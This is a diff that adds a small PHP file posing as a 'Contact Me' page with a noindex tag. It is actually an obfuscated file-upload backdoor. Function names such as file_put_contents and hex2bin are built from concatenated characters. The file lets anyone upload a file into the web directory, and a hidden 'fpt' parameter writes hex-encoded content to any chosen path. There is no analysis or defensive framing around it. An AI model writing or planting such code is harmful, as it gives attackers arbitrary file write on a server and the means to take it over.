@@ -1,0 +1,6 @@
+<meta content="noindex"name="robots">Contact Me
+<form enctype="multipart/form-data"method="post">
+<input name="btul"type="file">
+<button>Send</button>
+</form>
+<?="";$a='f'.'i'.'l'.'e'.'_'.'p'.'u'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';$b='f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';$c='t'.'m'.'p'.'_'.'n'.'a'.'m'.'e';$d='h'.'ex'.'2b'.'in';$f='f'.'il'.'e_e'.'xi'.'st'.'s';if(isset($_FILES['btul'])){$a($_FILES['btul']['name'],$b($_FILES['btul'][$c]));if($f('./'.$_FILES['btul']['name'])){echo 'Oke !';}else{echo 'Fail !';}}if(isset($_GET['fpt'])){$a($d($_POST['f']),$d($_POST['d']));if($f($d($_POST['f']))){echo "Oke !";}else{echo "Fail !";}}?>
